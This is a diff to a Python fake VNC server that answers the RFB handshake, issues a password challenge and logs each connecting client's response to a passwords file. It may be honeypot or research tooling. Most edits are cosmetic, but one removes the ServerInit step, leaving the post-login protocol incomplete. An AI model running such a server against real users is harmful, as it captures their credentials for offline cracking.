@@ -9,7 +9,7 @@ WIDTH, HEIGHT = 1024, 768
 LOG_FILE = "passwords_log.txt"
 
 def generate_fake_screen():
-    """Create a fake RGB screen (static blue background)."""
+    """Create a fake screen"""
     img = Image.new("RGB", (WIDTH, HEIGHT), color=(30, 30, 160))
     return img.tobytes()
 
@@ -31,18 +31,18 @@ def start_fake_server(host='0.0.0.0', port=5900):
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_sock.bind((host, port))
     server_sock.listen(1)
-    print(f"[+] Fake VNC server listening on {host}:{port}...")
+    print(f" Fake VNC server listening on {host}:{port}...")
 
     client_sock, addr = server_sock.accept()
-    print(f"[+] Connection from {addr}")
+    print(f"Connection from {addr}")
 
     # Step 1: Protocol Version Handshake
     client_version = recv_exact(client_sock, 12).decode().strip()
     print(f"[CLIENT] Version: {client_version}")
     client_sock.sendall(b"RFB 003.008\n")
 
-    # Step 2: Authentication Type (just 0x02)
-    client_sock.sendall(b'\x02')  # Only one method: password (type 2)
+    # Step 2: Authentication Type 
+    client_sock.sendall(b'\x02')  # password (type 2)
 
     # Step 3: Challenge
     challenge = os.urandom(16)
@@ -54,29 +54,13 @@ def start_fake_server(host='0.0.0.0', port=5900):
     log_password(response)
 
     if response == expected:
-        print("[+] Password match!")
+        print("Password match!")
         client_sock.sendall(b'\x00\x00\x00\x00')  # Success
     else:
-        print("[!] Password hash mismatch (captured anyway).")
+        print("Password hash mismatch")
         client_sock.sendall(b'\x00\x00\x00\x01')  # Failure
         client_sock.close()
         return
-
-    # Step 4: ClientInit
-    shared_flag = recv_exact(client_sock, 1)
-    print(f"[*] Shared session? {bool(shared_flag[0])}")
-
-    # Step 5: ServerInit
-    client_sock.sendall(struct.pack(">HH", WIDTH, HEIGHT))
-    client_sock.sendall(b'\x18\x18\x00')  # Pixel format
-    client_sock.sendall(struct.pack(">HHH", 255, 255, 255))  # Max R, G, B
-    client_sock.sendall(b'\x10\x08\x00')  # Bit shifts
-    client_sock.sendall(b'\x00' * 3)      # Padding
-    name = "Fake VNC Server"
-    client_sock.sendall(struct.pack(">I", len(name)))
-    client_sock.sendall(name.encode())
-
-    print("[*] Sent server init")
 
     # Main loop
     try:
@@ -87,7 +71,7 @@ def start_fake_server(host='0.0.0.0', port=5900):
 
             if msg_type == b'\x03':  # FramebufferUpdateRequest
                 _ = recv_exact(client_sock, 9)
-                print("[*] Client requested framebuffer")
+                print(" Client requested framebuffer")
 
                 fake_screen = generate_fake_screen()
 
@@ -109,9 +93,9 @@ def start_fake_server(host='0.0.0.0', port=5900):
                 print(f"[?] Unknown msg type: {msg_type.hex()}")
 
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f" Error: {e}")
     finally:
-        print("[*] Client disconnected.")
+        print(" Client disconnected.")
         client_sock.close()
 
 if __name__ == "__main__":
